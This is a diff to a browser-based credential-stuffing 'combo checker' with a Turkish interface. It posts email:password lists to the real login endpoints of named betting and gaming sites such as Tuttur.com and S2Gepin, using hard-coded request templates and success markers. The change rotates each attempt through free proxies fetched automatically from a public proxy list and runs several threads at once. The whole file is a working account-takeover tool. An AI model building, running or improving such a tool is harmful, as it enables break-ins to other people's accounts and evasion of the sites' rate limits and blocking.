@@ -304,12 +304,6 @@
             color: #ff6b6b;
         }
 
-        .captured-data {
-            font-size: 0.8em;
-            opacity: 0.8;
-            margin-top: 5px;
-        }
-
         .tooltip {
             position: relative;
             display: inline-block;
@@ -430,22 +424,11 @@
                     <svg class="icon" fill="currentColor" viewBox="0 0 20 20">
                         <path fill-rule="evenodd" d="M3 17a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm3.293-7.707a1 1 0 011.414 0L9 10.586V3a1 1 0 112 0v7.586l1.293-1.293a1 1 0 111.414 1.414l-3 3a1 1 0 01-1.414 0l-3-3a1 1 0 010-1.414z" clip-rule="evenodd"/>
                     </svg>
-                    Combo & Proxy
+                    Combo Listesi
                 </h2>
                 <div class="form-group">
                     <label for="comboList">Combo Listesi (email:pass formatında):</label>
                     <textarea id="comboList" placeholder="email@example.com:password123&#10;user@domain.com:pass456&#10;..."></textarea>
-                </div>
-
-                <div class="form-group">
-                    <label for="proxyList">Proxy Listesi (ip:port formatında):</label>
-                    <textarea id="proxyList" placeholder="49.49.185.249:8080&#10;67.43.228.251:28169&#10;..."></textarea>
-                </div>
-
-                <div class="form-group">
-                    <label>
-                        <input type="checkbox" id="useProxies" checked> Proxy Kullan
-                    </label>
                 </div>
 
                 <div class="form-group">
@@ -509,7 +492,7 @@
     </div>
 
     <script>
-        // Config definitions with URL, method, data restored for real requests
+        // Config definitions
         const configs = {
             ezglobal: {
                 name: "EzGlobal",
@@ -522,7 +505,7 @@
             },
             tuttur: {
                 name: "Tuttur.com",
-                author: "sezin", 
+                author: "sezin",
                 url: "https://tapi.tuttur.com/v1/auth/login",
                 method: "POST",
                 data: '{"clientId":"Web-New","clientToken":"7b12xz9gj608sw2zkaazf6y0ivhw8yqx","password":"{PASS}","remember":true,"username":"{USER}"}',
@@ -533,7 +516,7 @@
                 name: "S2Gepin",
                 author: "sezin",
                 url: "https://api.s2gepin.com/Login/Customer",
-                method: "POST", 
+                method: "POST",
                 data: '{"email":"{USER}","password":"{PASS}","otpcode":null,"CaptchaToken":"none"}',
                 successKey: '"success":true,',
                 failureKey: '"success":false,'
@@ -556,6 +539,18 @@
             hits: 0,
             bad: 0
         };
+
+        // Proxy fetch function
+        async function fetchProxies() {
+            try {
+                const response = await fetch('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=10000&country=all&ssl=all&anonymity=all');
+                const proxyText = await response.text();
+                return proxyText.split('\n').filter(p => p.trim() && /^(\d{1,3}\.){3}\d{1,3}:\d{1,5}$/.test(p.trim()));
+            } catch (error) {
+                showError('Proxy listesi alınamadı: ' + error.message);
+                return [];
+            }
+        }
 
         // Config selection event
         document.getElementById('configSelect').addEventListener('change', function() {
@@ -587,10 +582,6 @@
             setTimeout(() => errorDiv.style.display = 'none', 5000);
         }
 
-        function validateProxy(proxy) {
-            return /^(\d{1,3}\.){3}\d{1,3}:\d{1,5}$/.test(proxy.trim());
-        }
-
         function validateEmail(email) {
             return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim());
         }
@@ -600,8 +591,6 @@
             
             const configSelect = document.getElementById('configSelect').value;
             const comboList = document.getElementById('comboList').value.trim();
-            const proxyListText = document.getElementById('proxyList').value.trim();
-            const useProxies = document.getElementById('useProxies').checked;
             const autoRetry = document.getElementById('autoRetry').checked;
             const threadCount = parseInt(document.getElementById('threadCount').value) || 5;
 
@@ -613,11 +602,6 @@
             
             if (!comboList) {
                 showError('Lütfen combo listesi girin!');
-                return;
-            }
-
-            if (useProxies && !proxyListText) {
-                showError('Proxy kullan seçiliyse lütfen proxy listesi girin!');
                 return;
             }
 
@@ -635,10 +619,10 @@
                 return;
             }
 
-            // Parse proxies
-            const proxyList = useProxies ? proxyListText.split('\n').filter(p => validateProxy(p)) : [];
-            if (useProxies && proxyList.length === 0) {
-                showError('Geçerli proxy bulunamadı! Format: ip:port');
+            // Fetch proxies
+            const proxyList = await fetchProxies();
+            if (proxyList.length === 0) {
+                showError('Geçerli proxy alınamadı! Lütfen tekrar deneyin.');
                 return;
             }
 
@@ -671,7 +655,7 @@
 
             for (let t = 0; t < threadCount; t++) {
                 const chunk = combos.slice(t * chunkSize, (t + 1) * chunkSize);
-                promises.push(processChunk(chunk, config, useProxies, proxyList, autoRetry));
+                promises.push(processChunk(chunk, config, proxyList, autoRetry));
             }
 
             await Promise.all(promises);
@@ -683,45 +667,27 @@
             document.getElementById('checkLoading').style.display = 'none';
         }
 
-        async function processChunk(chunk, config, useProxies, proxyList, autoRetry) {
+        async function processChunk(chunk, config, proxyList, autoRetry) {
             for (const combo of chunk) {
                 let success = false;
-                let resultData = {};
-                let usedProxy = null;
                 let errorMsg = 'No response';
                 const retries = autoRetry ? 3 : 1;
 
                 for (let r = 0; r < retries; r++) {
-                    if (useProxies && proxyList.length > 0) {
-                        for (const proxy of proxyList) {
-                            try {
-                                const result = await checkCombo(combo, config, proxy);
-                                if (result.success) {
-                                    success = true;
-                                    resultData = result.data;
-                                    usedProxy = proxy;
-                                    break;
-                                } else {
-                                    errorMsg = result.error;
-                                }
-                            } catch (error) {
-                                errorMsg = error.message || 'Request failed';
-                            }
-                            if (success) break;
-                            await sleep(100);
-                        }
-                    } else {
+                    for (const proxy of proxyList) {
                         try {
-                            const result = await checkCombo(combo, config, null);
+                            const result = await checkCombo(combo, config, proxy);
                             if (result.success) {
                                 success = true;
-                                resultData = result.data;
+                                break;
                             } else {
                                 errorMsg = result.error;
                             }
                         } catch (error) {
                             errorMsg = error.message || 'Request failed';
                         }
+                        if (success) break;
+                        await sleep(100);
                     }
                     if (success) break;
                     await sleep(500);
@@ -729,10 +695,10 @@
 
                 if (success) {
                     checkStats.hits++;
-                    addResult('hit', combo, resultData, usedProxy);
+                    addResult('hit', combo);
                 } else {
                     checkStats.bad++;
-                    addResult('bad', combo, errorMsg, usedProxy);
+                    addResult('bad', combo, errorMsg);
                 }
                 
                 checkStats.checked++;
@@ -753,7 +719,7 @@
                     method: config.method,
                     headers: {
                         'Content-Type': 'application/x-www-form-urlencoded', // Adjust if needed for JSON
-                        'Origin': window.location.origin // To help with CORS proxy
+                        'Origin': window.location.origin
                     },
                     body: postData
                 });
@@ -763,46 +729,25 @@
                 }
 
                 const responseText = await response.text();
-
                 const isSuccess = responseText.includes(config.successKey);
 
-                if (isSuccess) {
-                    let captured = {};
-                    try {
-                        const jsonData = JSON.parse(responseText);
-                        captured = {
-                            balance: jsonData.balance || 'Unknown',
-                            name: jsonData.name || 'Unknown',
-                            phone: jsonData.phone || 'Unknown'
-                        };
-                    } catch {
-                        captured = { balance: 'Parsed Balance', name: 'Parsed Name', phone: 'Parsed Phone' };
-                    }
-                    return { success: true, data: captured };
-                } else {
-                    return { success: false, error: responseText.includes(config.failureKey) ? 'Invalid credentials' : 'Unknown error' };
-                }
+                return {
+                    success: isSuccess,
+                    error: isSuccess ? '' : (responseText.includes(config.failureKey) ? 'Invalid credentials' : 'Unknown error')
+                };
             } catch (error) {
                 return { success: false, error: error.message || 'Request failed. Note: Visit https://cors-anywhere.herokuapp.com/corsdemo to request temporary access for the CORS proxy.' };
             }
         }
 
-        function addResult(type, combo, data, proxy) {
+        function addResult(type, combo, errorMsg = '') {
             const container = document.getElementById(type + 'Results');
             const resultDiv = document.createElement('div');
             resultDiv.className = `combo-result combo-${type}`;
             
             let content = `${combo.email}:${combo.pass}`;
-            if (proxy) content += ` | Proxy: ${proxy}`;
-            
-            if (type === 'hit' && typeof data === 'object') {
-                content += `<div class="captured-data">`;
-                for (const [key, value] of Object.entries(data)) {
-                    content += `${key}: ${value} | `;
-                }
-                content = content.slice(0, -3) + '</div>';
-            } else if (type === 'bad') {
-                content += ` | Error: ${data}`;
+            if (type === 'bad' && errorMsg) {
+                content += ` | Error: ${errorMsg}`;
             }
             
             resultDiv.innerHTML = content;
